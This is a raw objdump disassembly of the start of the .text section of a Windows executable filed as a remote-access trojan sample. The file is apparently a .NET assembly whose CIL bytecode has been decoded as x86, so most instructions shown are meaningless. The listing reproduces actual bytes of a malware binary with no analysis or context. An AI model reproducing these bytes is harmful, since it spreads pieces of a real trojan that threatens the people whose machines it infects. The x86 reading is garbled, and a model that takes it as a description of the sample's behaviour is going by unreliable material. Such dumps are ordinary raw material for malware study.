
malware_samples/rat/6133cd0b2a8a7a1ecf353ae072c1e64934bfbeb0693cb7dc59d6d55173d6e0a7.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	90                   	nop
  402001:	da 00                	fiaddl (%eax)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 24 6f 00       	add    $0x6f2400,%eax
  402013:	00 34 6b             	add    %dh,(%ebx,%ebp,2)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	02 00                	add    (%eax),%al
  40201c:	5e                   	pop    %esi
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	6d                   	insl   (%dx),%es:(%edi)
  402051:	6f                   	outsl  %ds:(%esi),(%dx)
  402052:	6f                   	outsl  %ds:(%esi),(%dx)
  402053:	6d                   	insl   (%dx),%es:(%edi)
  402054:	38 32                	cmp    %dh,(%edx)
  402056:	35 00 03 ac 67       	xor    $0x67ac0300,%eax
  40205b:	42                   	inc    %edx
  40205c:	16                   	push   %ss
  40205d:	f3 e1 5c             	repz loope 0x4020bc
  402060:	76 1e                	jbe    0x402080
  402062:	e1 a5                	loope  0x402009
  402064:	e2 55                	loop   0x4020bb
  402066:	f0 67 95             	lock addr16 xchg %eax,%ebp
  402069:	36 23 c8             	ss and %eax,%ecx
  40206c:	b3 88                	mov    $0x88,%bl
  40206e:	b4 45                	mov    $0x45,%ah
  402070:	9e                   	sahf
  402071:	13 f9                	adc    %ecx,%edi
  402073:	78 d7                	js     0x40204c
  402075:	c8 46 f4 1e          	enter  $0xf446,$0x1e
  402079:	02 28                	add    (%eax),%ch
  40207b:	16                   	push   %ss
  40207c:	00 00                	add    %al,(%eax)
  40207e:	0a 2a                	or     (%edx),%ch
  402080:	ce                   	into
  402081:	02 73 17             	add    0x17(%ebx),%dh
  402084:	00 00                	add    %al,(%eax)
  402086:	0a 7d 03             	or     0x3(%ebp),%bh
  402089:	00 00                	add    %al,(%eax)
  40208b:	04 02                	add    $0x2,%al
  40208d:	72 01                	jb     0x402090
  40208f:	00 00                	add    %al,(%eax)
  402091:	70 7d                	jo     0x402110
  402093:	04 00                	add    $0x0,%al
  402095:	00 04 02             	add    %al,(%edx,%eax,1)
  402098:	28 16                	sub    %dl,(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	0a 28                	or     (%eax),%ch
  40209e:	18 00                	sbb    %al,(%eax)
  4020a0:	00 0a                	add    %cl,(%edx)
  4020a2:	14 fe                	adc    $0xfe,%al
  4020a4:	06                   	push   %es
  4020a5:	0b 00                	or     (%eax),%eax
  4020a7:	00 06                	add    %al,(%esi)
  4020a9:	73 19                	jae    0x4020c4
  4020ab:	00 00                	add    %al,(%eax)
  4020ad:	0a 6f 1a             	or     0x1a(%edi),%ch
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	0a 2a                	or     (%edx),%ch
  4020b4:	92                   	xchg   %eax,%edx
  4020b5:	03 6f 1e             	add    0x1e(%edi),%ebp
  4020b8:	00 00                	add    %al,(%eax)
  4020ba:	0a 73 1f             	or     0x1f(%ebx),%dh
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	0a 28                	or     (%eax),%ch
  4020c1:	20 00                	and    %al,(%eax)
  4020c3:	00 0a                	add    %cl,(%edx)
  4020c5:	72 19                	jb     0x4020e0
  4020c7:	00 00                	add    %al,(%eax)
  4020c9:	70 28                	jo     0x4020f3
  4020cb:	21 00                	and    %eax,(%eax)
  4020cd:	00 0a                	add    %cl,(%edx)
  4020cf:	2c 06                	sub    $0x6,%al
  4020d1:	28 22                	sub    %ah,(%edx)
  4020d3:	00 00                	add    %al,(%eax)
  4020d5:	0a 2a                	or     (%edx),%ch
  4020d7:	14 2a                	adc    $0x2a,%al
  4020d9:	36 02 7c 06 00       	add    %ss:0x0(%esi,%eax,1),%bh
  4020de:	00 04 03             	add    %al,(%ebx,%eax,1)
  4020e1:	28 3f                	sub    %bh,(%edi)
  4020e3:	00 00                	add    %al,(%eax)
  4020e5:	0a 2a                	or     (%edx),%ch
  4020e7:	56                   	push   %esi
  4020e8:	02 28                	add    (%eax),%ch
  4020ea:	16                   	push   %ss
  4020eb:	00 00                	add    %al,(%eax)
  4020ed:	0a 02                	or     (%edx),%al
  4020ef:	04 7d                	add    $0x7d,%al
  4020f1:	14 00                	adc    $0x0,%al
  4020f3:	00 04 02             	add    %al,(%edx,%eax,1)
  4020f6:	03 7d 13             	add    0x13(%ebp),%edi
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	04 2a                	add    $0x2a,%al
  4020fd:	06                   	push   %es
  4020fe:	2a 36                	sub    (%esi),%dh
  402100:	02 7c 16 00          	add    0x0(%esi,%edx,1),%bh
  402104:	00 04 03             	add    %al,(%ebx,%eax,1)
  402107:	28 3f                	sub    %bh,(%edi)
  402109:	00 00                	add    %al,(%eax)
  40210b:	0a 2a                	or     (%edx),%ch
  40210d:	36 02 7c 1c 00       	add    %ss:0x0(%esp,%ebx,1),%bh
  402112:	00 04 03             	add    %al,(%ebx,%eax,1)
  402115:	28 3f                	sub    %bh,(%edi)
  402117:	00 00                	add    %al,(%eax)
  402119:	0a 2a                	or     (%edx),%ch
  40211b:	36 02 7c 20 00       	add    %ss:0x0(%eax,%eiz,1),%bh
  402120:	00 04 03             	add    %al,(%ebx,%eax,1)
  402123:	28 3f                	sub    %bh,(%edi)
  402125:	00 00                	add    %al,(%eax)
  402127:	0a 2a                	or     (%edx),%ch
  402129:	36 02 7c 25 00       	add    %ss:0x0(%ebp,%eiz,1),%bh
  40212e:	00 04 03             	add    %al,(%ebx,%eax,1)
  402131:	28 3f                	sub    %bh,(%edi)
  402133:	00 00                	add    %al,(%eax)
  402135:	0a 2a                	or     (%edx),%ch
  402137:	36 02 7c 2e 00       	add    %ss:0x0(%esi,%ebp,1),%bh
  40213c:	00 04 03             	add    %al,(%ebx,%eax,1)
  40213f:	28 3f                	sub    %bh,(%edi)
  402141:	00 00                	add    %al,(%eax)
  402143:	0a 2a                	or     (%edx),%ch
  402145:	36 02 7c 33 00       	add    %ss:0x0(%ebx,%esi,1),%bh
  40214a:	00 04 03             	add    %al,(%ebx,%eax,1)
  40214d:	28 3f                	sub    %bh,(%edi)
  40214f:	00 00                	add    %al,(%eax)
  402151:	0a 2a                	or     (%edx),%ch
  402153:	36 02 7c 39 00       	add    %ss:0x0(%ecx,%edi,1),%bh
  402158:	00 04 03             	add    %al,(%ebx,%eax,1)
  40215b:	28 3f                	sub    %bh,(%edi)
  40215d:	00 00                	add    %al,(%eax)
  40215f:	0a 2a                	or     (%edx),%ch
  402161:	36 02 7c 3f 00       	add    %ss:0x0(%edi,%edi,1),%bh
  402166:	00 04 03             	add    %al,(%ebx,%eax,1)
  402169:	28 3f                	sub    %bh,(%edi)
  40216b:	00 00                	add    %al,(%eax)
  40216d:	0a 2a                	or     (%edx),%ch
  40216f:	d6                   	salc
  402170:	02 73 6c             	add    0x6c(%ebx),%dh
  402173:	00 00                	add    %al,(%eax)
  402175:	0a 7d 46             	or     0x46(%ebp),%bh
  402178:	00 00                	add    %al,(%eax)
  40217a:	04 02                	add    $0x2,%al
  40217c:	15 7d 49 00 00       	adc    $0x497d,%eax
  402181:	04 02                	add    $0x2,%al
  402183:	15 7d 4a 00 00       	adc    $0x4a7d,%eax
  402188:	04 02                	add    $0x2,%al
  40218a:	15 7d 4b 00 00       	adc    $0x4b7d,%eax
  40218f:	04 02                	add    $0x2,%al
  402191:	28 16                	sub    %dl,(%esi)
  402193:	00 00                	add    %al,(%eax)
  402195:	0a 02                	or     (%edx),%al
  402197:	03 7d 47             	add    0x47(%ebp),%edi
  40219a:	00 00                	add    %al,(%eax)
  40219c:	04 02                	add    $0x2,%al
  40219e:	04 7d                	add    $0x7d,%al
  4021a0:	45                   	inc    %ebp
  4021a1:	00 00                	add    %al,(%eax)
  4021a3:	04 2a                	add    $0x2a,%al
  4021a5:	36 02 7b 46          	add    %ss:0x46(%ebx),%bh
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 03                	add    $0x3,%al
  4021ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ae:	6d                   	insl   (%dx),%es:(%edi)
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 2a                	or     (%edx),%ch
  4021b3:	66 03 8e 69 04 8e 69 	add    0x698e0469(%esi),%cx
  4021ba:	33 0f                	xor    (%edi),%ecx
  4021bc:	03 04 03             	add    (%ebx,%eax,1),%eax
  4021bf:	8e 69 6a             	mov    0x6a(%ecx),%gs
  4021c2:	28 2b                	sub    %ch,(%ebx)
  4021c4:	00 00                	add    %al,(%eax)
  4021c6:	06                   	push   %es
  4021c7:	16                   	push   %ss
  4021c8:	fe 01                	incb   (%ecx)
  4021ca:	2a 16                	sub    (%esi),%dl
  4021cc:	2a 36                	sub    (%esi),%dh
  4021ce:	02 7b 47             	add    0x47(%ebx),%bh
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	04 03                	add    $0x3,%al
  4021d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021d6:	4c                   	dec    %esp
  4021d7:	00 00                	add    %al,(%eax)
  4021d9:	06                   	push   %es
  4021da:	2a 32                	sub    (%edx),%dh
  4021dc:	02 7b 47             	add    0x47(%ebx),%bh
  4021df:	00 00                	add    %al,(%eax)
  4021e1:	04 6f                	add    $0x6f,%al
  4021e3:	4d                   	dec    %ebp
  4021e4:	00 00                	add    %al,(%eax)
  4021e6:	06                   	push   %es
  4021e7:	2a 36                	sub    (%esi),%dh
  4021e9:	02 7c 4d 00          	add    0x0(%ebp,%ecx,2),%bh
  4021ed:	00 04 03             	add    %al,(%ebx,%eax,1)
  4021f0:	28 8b 00 00 0a 2a    	sub    %cl,0x2a0a0000(%ebx)
  4021f6:	36 02 7c 51 00       	add    %ss:0x0(%ecx,%edx,2),%bh
  4021fb:	00 04 03             	add    %al,(%ebx,%eax,1)
  4021fe:	28 92 00 00 0a 2a    	sub    %dl,0x2a0a0000(%edx)
  402204:	36 02 7c 5c 00       	add    %ss:0x0(%esp,%ebx,2),%bh
  402209:	00 04 03             	add    %al,(%ebx,%eax,1)
  40220c:	28 96 00 00 0a 2a    	sub    %dl,0x2a0a0000(%esi)
  402212:	36 02 7c 60 00       	add    %ss:0x0(%eax,%eiz,2),%bh
  402217:	00 04 03             	add    %al,(%ebx,%eax,1)
  40221a:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  402220:	36 02 7c 65 00       	add    %ss:0x0(%ebp,%eiz,2),%bh
  402225:	00 04 03             	add    %al,(%ebx,%eax,1)
  402228:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  40222e:	3a 02                	cmp    (%edx),%al
  402230:	17                   	pop    %ss
  402231:	7d 6e                	jge    0x4022a1
  402233:	00 00                	add    %al,(%eax)
  402235:	04 02                	add    $0x2,%al
  402237:	28 16                	sub    %dl,(%esi)
  402239:	00 00                	add    %al,(%eax)
  40223b:	0a 2a                	or     (%edx),%ch
  40223d:	86 02                	xchg   %al,(%edx)
  40223f:	28 16                	sub    %dl,(%esi)
  402241:	00 00                	add    %al,(%eax)
  402243:	0a 02                	or     (%edx),%al
  402245:	03 7d 6f             	add    0x6f(%ebp),%edi
  402248:	00 00                	add    %al,(%eax)
  40224a:	04 02                	add    $0x2,%al
  40224c:	7b 6f                	jnp    0x4022bd
  40224e:	00 00                	add    %al,(%eax)
  402250:	04 17                	add    $0x17,%al
  402252:	6f                   	outsl  %ds:(%esi),(%dx)
  402253:	9c                   	pushf
  402254:	00 00                	add    %al,(%eax)
  402256:	0a 02                	or     (%edx),%al
  402258:	04 7d                	add    $0x7d,%al
  40225a:	70 00                	jo     0x40225c
  40225c:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40225f:	52                   	push   %edx
  402260:	02 03                	add    (%ebx),%al
  402262:	7d 71                	jge    0x4022d5
  402264:	00 00                	add    %al,(%eax)
  402266:	04 02                	add    $0x2,%al
  402268:	7b 6f                	jnp    0x4022d9
  40226a:	00 00                	add    %al,(%eax)
  40226c:	04 03                	add    $0x3,%al
  40226e:	6f                   	outsl  %ds:(%esi),(%dx)
  40226f:	a3 00 00 0a 2a       	mov    %eax,0x2a0a0000
  402274:	52                   	push   %edx
  402275:	02 16                	add    (%esi),%dl
  402277:	7d 71                	jge    0x4022ea
  402279:	00 00                	add    %al,(%eax)
  40227b:	04 02                	add    $0x2,%al
  40227d:	7b 6f                	jnp    0x4022ee
  40227f:	00 00                	add    %al,(%eax)
  402281:	04 16                	add    $0x16,%al
  402283:	6f                   	outsl  %ds:(%esi),(%dx)
  402284:	a3 00 00 0a 2a       	mov    %eax,0x2a0a0000
  402289:	36 02 7c 73 00       	add    %ss:0x0(%ebx,%esi,2),%bh
  40228e:	00 04 03             	add    %al,(%ebx,%eax,1)
  402291:	28 96 00 00 0a 2a    	sub    %dl,0x2a0a0000(%esi)
  402297:	36 02 7c 7b 00       	add    %ss:0x0(%ebx,%edi,2),%bh
  40229c:	00 04 03             	add    %al,(%ebx,%eax,1)
  40229f:	28 96 00 00 0a 2a    	sub    %dl,0x2a0a0000(%esi)
  4022a5:	2e 73 53             	jae,pn 0x4022fb
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	06                   	push   %es
  4022ab:	80 85 00 00 04 2a 0a 	addb   $0xa,0x2a040000(%ebp)
  4022b2:	03 2a                	add    (%edx),%ebp
  4022b4:	36 02 7c 88 00       	add    %ss:0x0(%eax,%ecx,4),%bh
  4022b9:	00 04 03             	add    %al,(%ebx,%eax,1)
  4022bc:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  4022c2:	36 02 7c 8d 00       	add    %ss:0x0(%ebp,%ecx,4),%bh
  4022c7:	00 04 03             	add    %al,(%ebx,%eax,1)
  4022ca:	28 96 00 00 0a 2a    	sub    %dl,0x2a0a0000(%esi)
  4022d0:	32 02                	xor    (%edx),%al
  4022d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d3:	30 00                	xor    %al,(%eax)
  4022d5:	00 06                	add    %al,(%esi)
  4022d7:	28 b4 00 00 0a 2a 36 	sub    %dh,0x362a0a00(%eax,%eax,1)
  4022de:	02 7c 9c 00          	add    0x0(%esp,%ebx,4),%bh
  4022e2:	00 04 03             	add    %al,(%ebx,%eax,1)
  4022e5:	28 3f                	sub    %bh,(%edi)
  4022e7:	00 00                	add    %al,(%eax)
  4022e9:	0a 2a                	or     (%edx),%ch
  4022eb:	3a 02                	cmp    (%edx),%al
  4022ed:	28 c7                	sub    %al,%bh
  4022ef:	00 00                	add    %al,(%eax)
  4022f1:	0a 02                	or     (%edx),%al
  4022f3:	03 7d a4             	add    -0x5c(%ebp),%edi
  4022f6:	00 00                	add    %al,(%eax)
  4022f8:	04 2a                	add    $0x2a,%al
  4022fa:	32 02                	xor    (%edx),%al
  4022fc:	7b a4                	jnp    0x4022a2
  4022fe:	00 00                	add    %al,(%eax)
  402300:	04 6f                	add    $0x6f,%al
  402302:	c8 00 00 0a          	enter  $0x0,$0xa
  402306:	2a 66 7e             	sub    0x7e(%esi),%ah
  402309:	9a 00 00 04 03 6f c9 	lcall  $0xc96f,$0x3040000
  402310:	00 00                	add    %al,(%eax)
  402312:	0a 26                	or     (%esi),%ah
  402314:	02 7b a4             	add    -0x5c(%ebx),%bh
  402317:	00 00                	add    %al,(%eax)
  402319:	04 03                	add    $0x3,%al
  40231b:	6f                   	outsl  %ds:(%esi),(%dx)
  40231c:	ca 00 00             	lret   $0x0
  40231f:	0a 2a                	or     (%edx),%ch
  402321:	66 7e 9a             	data16 jle 0x4022be
  402324:	00 00                	add    %al,(%eax)
  402326:	04 03                	add    $0x3,%al
  402328:	6f                   	outsl  %ds:(%esi),(%dx)
  402329:	cb                   	lret
  40232a:	00 00                	add    %al,(%eax)
  40232c:	0a 26                	or     (%esi),%ah
  40232e:	02 7b a4             	add    -0x5c(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 03                	add    $0x3,%al
  402335:	6f                   	outsl  %ds:(%esi),(%dx)
  402336:	cc                   	int3
  402337:	00 00                	add    %al,(%eax)
  402339:	0a 2a                	or     (%edx),%ch
  40233b:	2e 7e 9a             	jle,pn 0x4022d8
  40233e:	00 00                	add    %al,(%eax)
  402340:	04 6f                	add    $0x6f,%al
  402342:	63 00                	arpl   %eax,(%eax)
  402344:	00 0a                	add    %cl,(%edx)
  402346:	2a 32                	sub    (%edx),%dh
  402348:	7e 9a                	jle    0x4022e4
  40234a:	00 00                	add    %al,(%eax)
  40234c:	04 6f                	add    $0x6f,%al
  40234e:	cd 00                	int    $0x0
  402350:	00 0a                	add    %cl,(%edx)
  402352:	26 2a 2e             	sub    %es:(%esi),%ch
  402355:	73 7e                	jae    0x4023d5
  402357:	00 00                	add    %al,(%eax)
  402359:	06                   	push   %es
  40235a:	80 a7 00 00 04 2a 1a 	andb   $0x1a,0x2a040000(%edi)
  402361:	28 6f 00             	sub    %ch,0x0(%edi)
  402364:	00 06                	add    %al,(%esi)
  402366:	2a 1a                	sub    (%edx),%bl
  402368:	28 7b 00             	sub    %bh,0x0(%ebx)
  40236b:	00 06                	add    %al,(%esi)
  40236d:	2a 36                	sub    (%esi),%dh
  40236f:	02 7c ab 00          	add    0x0(%ebx,%ebp,4),%bh
  402373:	00 04 03             	add    %al,(%ebx,%eax,1)
  402376:	28 fd                	sub    %bh,%ch
  402378:	00 00                	add    %al,(%eax)
  40237a:	0a 2a                	or     (%edx),%ch
  40237c:	36 02 7c ae 00       	add    %ss:0x0(%esi,%ebp,4),%bh
  402381:	00 04 03             	add    %al,(%ebx,%eax,1)
  402384:	28 92 00 00 0a 2a    	sub    %dl,0x2a0a0000(%edx)
  40238a:	36 02 7c b8 00       	add    %ss:0x0(%eax,%edi,4),%bh
  40238f:	00 04 03             	add    %al,(%ebx,%eax,1)
  402392:	28 3f                	sub    %bh,(%edi)
  402394:	00 00                	add    %al,(%eax)
  402396:	0a 2a                	or     (%edx),%ch
  402398:	36 02 7c bc 00       	add    %ss:0x0(%esp,%edi,4),%bh
  40239d:	00 04 03             	add    %al,(%ebx,%eax,1)
  4023a0:	28 3f                	sub    %bh,(%edi)
  4023a2:	00 00                	add    %al,(%eax)
  4023a4:	0a 2a                	or     (%edx),%ch
  4023a6:	36 02 7c c1 00       	add    %ss:0x0(%ecx,%eax,8),%bh
  4023ab:	00 04 03             	add    %al,(%ebx,%eax,1)
  4023ae:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  4023b4:	36 02 7c c6 00       	add    %ss:0x0(%esi,%eax,8),%bh
  4023b9:	00 04 03             	add    %al,(%ebx,%eax,1)
  4023bc:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  4023c2:	36 02 7c cd 00       	add    %ss:0x0(%ebp,%ecx,8),%bh
  4023c7:	00 04 03             	add    %al,(%ebx,%eax,1)
  4023ca:	28 24 01             	sub    %ah,(%ecx,%eax,1)
  4023cd:	00 0a                	add    %cl,(%edx)
  4023cf:	2a 13                	sub    (%ebx),%dl
  4023d1:	30 08                	xor    %cl,(%eax)
  4023d3:	00 67 00             	add    %ah,0x0(%edi)
  4023d6:	00 00                	add    %al,(%eax)
  4023d8:	01 00                	add    %eax,(%eax)
  4023da:	00 11                	add    %dl,(%ecx)
  4023dc:	02 8e 69 1c 5a 8d    	add    -0x72a5e397(%esi),%cl
  4023e2:	2e 00 00             	add    %al,%cs:(%eax)
  4023e5:	01 0a                	add    %ecx,(%edx)
  4023e7:	16                   	push   %ss
  4023e8:	0b 16                	or     (%esi),%edx
  4023ea:	0c 20                	or     $0x20,%al
  4023ec:	02 01                	add    (%ecx),%al
  4023ee:	00 00                	add    %al,(%eax)
  4023f0:	12 01                	adc    (%ecx),%al
  4023f2:	12 02                	adc    (%edx),%al
  4023f4:	28 01                	sub    %al,(%ecx)
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	06                   	push   %es
  4023f9:	2c 02                	sub    $0x2,%al
  4023fb:	14 2a                	adc    $0x2a,%al
  4023fd:	16                   	push   %ss
  4023fe:	0d 16 07 6e 73       	or     $0x736e0716,%eax
  402403:	14 00                	adc    $0x0,%al
  402405:	00 0a                	add    %cl,(%edx)
  402407:	28 04 00             	sub    %al,(%eax,%eax,1)
  40240a:	00 06                	add    %al,(%esi)
  40240c:	13 04 20             	adc    (%eax,%eiz,1),%eax
  40240f:	02 01                	add    (%ecx),%al
  402411:	00 00                	add    %al,(%eax)
  402413:	02 02                	add    (%edx),%al
  402415:	8e 69 06             	mov    0x6(%ecx),%gs
  402418:	06                   	push   %es
  402419:	8e 69 16             	mov    0x16(%ecx),%gs
  40241c:	12 03                	adc    (%ebx),%al
  40241e:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402421:	03 00                	add    (%eax),%eax
  402423:	00 06                	add    %al,(%esi)
  402425:	2c 0a                	sub    $0xa,%al
  402427:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  40242a:	05 00 00 06 26       	add    $0x26060000,%eax
  40242f:	14 2a                	adc    $0x2a,%al
  402431:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402434:	05 00 00 06 26       	add    $0x26060000,%eax
  402439:	12 00                	adc    (%eax),%al
  40243b:	09 28                	or     %ebp,(%eax)
  40243d:	01 00                	add    %eax,(%eax)
  40243f:	00 2b                	add    %ch,(%ebx)
  402441:	06                   	push   %es
  402442:	2a 00                	sub    (%eax),%al
  402444:	13 30                	adc    (%eax),%esi
  402446:	06                   	push   %es
  402447:	00 1a                	add    %bl,(%edx)
  402449:	00 00                	add    %al,(%eax)
  40244b:	00 02                	add    %al,(%edx)
  40244d:	00 00                	add    %al,(%eax)
  40244f:	11 16                	adc    %edx,(%esi)
  402451:	0a 03                	or     (%ebx),%al
  402453:	8d 2e                	lea    (%esi),%ebp
  402455:	00 00                	add    %al,(%eax)
  402457:	01 0b                	add    %ecx,(%ebx)
  402459:	18 07                	sbb    %al,(%edi)
  40245b:	03 02                	add    (%edx),%eax
  40245d:	02 8e 69 12 00 28    	add    0x28001269(%esi),%cl
  402463:	02 00                	add    (%eax),%al
  402465:	00 06                	add    %al,(%esi)
  402467:	26 07                	es pop %es
  402469:	2a 00                	sub    (%eax),%al
  40246b:	00 13                	add    %dl,(%ebx)
  40246d:	30 02                	xor    %al,(%edx)
  40246f:	00 3f                	add    %bh,(%edi)
  402471:	00 00                	add    %al,(%eax)
  402473:	00 03                	add    %al,(%ebx)
  402475:	00 00                	add    %al,(%eax)
  402477:	11 12                	adc    %edx,(%edx)
  402479:	00 28                	add    %ch,(%eax)
  40247b:	1b 00                	sbb    (%eax),%eax
  40247d:	00 0a                	add    %cl,(%edx)
  40247f:	7d 06                	jge    0x402487
  402481:	00 00                	add    %al,(%eax)
  402483:	04 12                	add    $0x12,%al
  402485:	00 02                	add    %al,(%edx)
  402487:	7d 08                	jge    0x402491
  402489:	00 00                	add    %al,(%eax)
  40248b:	04 12                	add    $0x12,%al
  40248d:	00 03                	add    %al,(%ebx)
  40248f:	7d 07                	jge    0x402498
  402491:	00 00                	add    %al,(%eax)
  402493:	04 12                	add    $0x12,%al
  402495:	00 15 7d 05 00 00    	add    %dl,0x57d
  40249b:	04 12                	add    $0x12,%al
  40249d:	00 7c 06 00          	add    %bh,0x0(%esi,%eax,1)
  4024a1:	00 04 12             	add    %al,(%edx,%edx,1)
  4024a4:	00 28                	add    %ch,(%eax)
  4024a6:	02 00                	add    (%eax),%al
  4024a8:	00 2b                	add    %ch,(%ebx)
  4024aa:	12 00                	adc    (%eax),%al
  4024ac:	7c 06                	jl     0x4024b4
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	04 28                	add    $0x28,%al
  4024b2:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  4024b7:	00 1b                	add    %bl,(%ebx)
  4024b9:	30 06                	xor    %al,(%esi)
  4024bb:	00 b8 04 00 00 04    	add    %bh,0x4000004(%eax)
  4024c1:	00 00                	add    %al,(%eax)
  4024c3:	11 02                	adc    %eax,(%edx)
  4024c5:	7b 05                	jnp    0x4024cc
  4024c7:	00 00                	add    %al,(%eax)
  4024c9:	04 0a                	add    $0xa,%al
  4024cb:	02 7b 08             	add    0x8(%ebx),%bh
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	04 0b                	add    $0xb,%al
  4024d2:	06                   	push   %es
  4024d3:	45                   	inc    %ebp
  4024d4:	07                   	pop    %es
  4024d5:	00 00                	add    %al,(%eax)
  4024d7:	00 3e                	add    %bh,(%esi)
  4024d9:	00 00                	add    %al,(%eax)
  4024db:	00 3e                	add    %bh,(%esi)
  4024dd:	00 00                	add    %al,(%eax)
  4024df:	00 3e                	add    %bh,(%esi)
  4024e1:	00 00                	add    %al,(%eax)
  4024e3:	00 3e                	add    %bh,(%esi)
  4024e5:	00 00                	add    %al,(%eax)
  4024e7:	00 3e                	add    %bh,(%esi)
  4024e9:	00 00                	add    %al,(%eax)
  4024eb:	00 73 03             	add    %dh,0x3(%ebx)
  4024ee:	00 00                	add    %al,(%eax)
  4024f0:	ec                   	in     (%dx),%al
  4024f1:	03 00                	add    (%eax),%eax
  4024f3:	00 02                	add    %al,(%edx)
  4024f5:	17                   	pop    %ss
  4024f6:	8d 2e                	lea    (%esi),%ebp
  4024f8:	00 00                	add    %al,(%eax)
  4024fa:	01 25 16 17 9c 7d    	add    %esp,0x7d9c1716
  402500:	09 00                	or     %eax,(%eax)
  402502:	00 04 02             	add    %al,(%edx,%eax,1)
  402505:	17                   	pop    %ss
  402506:	8d 2e                	lea    (%esi),%ebp
  402508:	00 00                	add    %al,(%eax)
  40250a:	01 7d 0a             	add    %edi,0xa(%ebp)
  40250d:	00 00                	add    %al,(%eax)
  40250f:	04 02                	add    $0x2,%al
  402511:	17                   	pop    %ss
  402512:	8d 2e                	lea    (%esi),%ebp
  402514:	00 00                	add    %al,(%eax)
  402516:	01 25 16 18 9c 7d    	add    %esp,0x7d9c1816
  40251c:	0b 00                	or     (%eax),%eax
  40251e:	00 04 17             	add    %al,(%edi,%edx,1)
  402521:	8d 2e                	lea    (%esi),%ebp
  402523:	00 00                	add    %al,(%eax)
  402525:	01 25 16 19 9c 26    	add    %esp,0x269c1916
  40252b:	02 16                	add    (%esi),%dl
  40252d:	7d 0d                	jge    0x40253c
  40252f:	00 00                	add    %al,(%eax)
  402531:	04 00                	add    $0x0,%al
  402533:	06                   	push   %es
  402534:	45                   	inc    %ebp
  402535:	05 00 00 00 3f       	add    $0x3f000000,%eax
  40253a:	00 00                	add    %al,(%eax)
  40253c:	00 db                	add    %bl,%bl
  40253e:	00 00                	add    %al,(%eax)
  402540:	00 3f                	add    %bh,(%edi)
  402542:	01 00                	add    %eax,(%eax)
  402544:	00 cd                	add    %cl,%ch
  402546:	01 00                	add    %eax,(%eax)
  402548:	00 74 02 00          	add    %dh,0x0(%edx,%eax,1)
  40254c:	00 02                	add    %al,(%edx)
  40254e:	7b 07                	jnp    0x402557
  402550:	00 00                	add    %al,(%eax)
  402552:	04 6f                	add    $0x6f,%al
  402554:	31 00                	xor    %eax,(%eax)
  402556:	00 06                	add    %al,(%esi)
  402558:	6f                   	outsl  %ds:(%esi),(%dx)
  402559:	23 00                	and    (%eax),%eax
  40255b:	00 0a                	add    %cl,(%edx)
  40255d:	13 04 12             	adc    (%edx,%edx,1),%eax
  402560:	04 28                	add    $0x28,%al
  402562:	24 00                	and    $0x0,%al
  402564:	00 0a                	add    %cl,(%edx)
  402566:	2d 41 02 16 25       	sub    $0x25160241,%eax
  40256b:	0a 7d 05             	or     0x5(%ebp),%bh
  40256e:	00 00                	add    %al,(%eax)
  402570:	04 02                	add    $0x2,%al
  402572:	11 04 7d 0f 00 00 04 	adc    %eax,0x400000f(,%edi,2)
  402579:	02 7c 06 00          	add    0x0(%esi,%eax,1),%bh
  40257d:	00 04 12             	add    %al,(%edx,%edx,1)
  402580:	04 02                	add    $0x2,%al
  402582:	28 03                	sub    %al,(%ebx)
  402584:	00 00                	add    %al,(%eax)
  402586:	2b dd                	sub    %ebp,%ebx
  402588:	ef                   	out    %eax,(%dx)
  402589:	03 00                	add    (%eax),%eax
  40258b:	00 02                	add    %al,(%edx)
  40258d:	7b 0f                	jnp    0x40259e
  40258f:	00 00                	add    %al,(%eax)
  402591:	04 13                	add    $0x13,%al
  402593:	04 02                	add    $0x2,%al
  402595:	7c 0f                	jl     0x4025a6
  402597:	00 00                	add    %al,(%eax)
  402599:	04 fe                	add    $0xfe,%al
  40259b:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4025a0:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	04 12                	add    $0x12,%al
  4025aa:	04 28                	add    $0x28,%al
  4025ac:	26 00 00             	add    %al,%es:(%eax)
  4025af:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4025b2:	28 27                	sub    %ah,(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 08                	or     (%eax),%cl
  4025b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4025b9:	28 00                	sub    %al,(%eax)
  4025bb:	00 0a                	add    %cl,(%edx)
  4025bd:	7d 0e                	jge    0x4025cd
  4025bf:	00 00                	add    %al,(%eax)
  4025c1:	04 02                	add    $0x2,%al
  4025c3:	7b 0e                	jnp    0x4025d3
  4025c5:	00 00                	add    %al,(%eax)
